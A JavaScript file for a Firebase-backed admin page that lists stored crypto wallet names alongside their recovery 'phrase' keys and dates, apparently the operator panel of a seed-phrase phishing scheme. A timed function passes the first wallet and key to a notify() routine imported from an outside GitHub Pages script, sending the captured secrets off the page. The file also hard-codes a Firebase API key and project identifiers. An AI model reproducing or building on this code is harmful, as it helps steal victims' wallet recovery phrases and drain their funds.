// import firebase from "https://cdn.skypack.dev/firebase/compat/app";
// import "https://cdn.skypack.dev/firebase/compat/auth";
// import "https://cdn.skypack.dev/firebase/compat/firestore";

import {notify} from 'https://giterhaber.github.io/web-codes/notification.js'

const firebaseConfig = {
  apiKey: "AIzaSyDAk6wPmjinvA2AaKkBpXFpOkEwXssluvc",
  authDomain: "chainresolver.firebaseapp.com",
  projectId: "chainresolver",
  storageBucket: "chainresolver.appspot.com",
  messagingSenderId: "28247484124",
  appId: "1:28247484124:web:af0fc65ac1c51600b1b619"
  };
  
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();
  const auth = firebase.auth();
  
  const rootDIV = document.querySelector('#root');
  
  
  function deleteTodo(event) {
    let button = event.target
    let docId = button.parentElement.id
  
  
    if (confirm('delete sure?')) {
      console.log(docId)
      db.collection('data').doc(docId).delete()
        .then(() => {
          alert('Data Deleted')
          window.location.reload();
        })
        .catch((err) => {
          console.log(err)
        })
  
    }
  
  }
  
  
  //get data
   db.collection("data").orderBy("time", "desc").get().then((querySnapshot) => {
   querySnapshot.forEach((doc) => {
  // doc.data() is never undefined for query doc snapshots

  // console.log(doc.id, " => ", doc.data());
  
  let wallet = doc.data().wallet
  let phrase = doc.data().phrase
  let date = doc.data().time

  
  // console.log(`Wallet: ${wallet} <br> ${phrase}`)
  
  let text = `
  <div>Wallet: <span>${wallet}</span></div>
  <div>Key: <span>${phrase}</span></div>
  <div>Date: <span>${date.toDate()}</span></div>
  <br><br>
  `

  // let para = document.createElement("div")
  // para.innerHTML = text
  // rootDIV.appendChild(para)
   
     let line = document.createElement("div");
     line.id = doc.id;
     line.innerHTML = text
     rootDIV.appendChild(line)
  
  
  //del button
  let delBtn = document.createElement("button")
     delBtn.setAttribute("style", "background-color: rgb(54, 57, 63); color:white;")
     delBtn.innerHTML = "🗑️"
  delBtn.addEventListener("click", deleteTodo)
  line.prepend(delBtn)
  
  
  });
  });
  
  
  
  document.querySelector('#logout').addEventListener("click", signoutpage)
  function signoutpage() {
  firebase.auth().signOut();
  
  }
  
   firebase.auth().onAuthStateChanged((user) => {
      if (user) {
        // User is signed in, see docs for a list of available properties
        // https://firebase.google.com/docs/reference/js/firebase.User
        var uid = user.uid;
        // ...
      } else {
        location.href = "/";
      }
    });

    const forNotif = () => {

      let root = $('#root')
    
      //contents
      let wallet = root.find('div').eq([1]).find('span').html()

      let key = root.find('div').eq([2]).find('span').html()
      
      notify(`${wallet}  ${key}`)

     }
    
     setTimeout(forNotif, 2000)
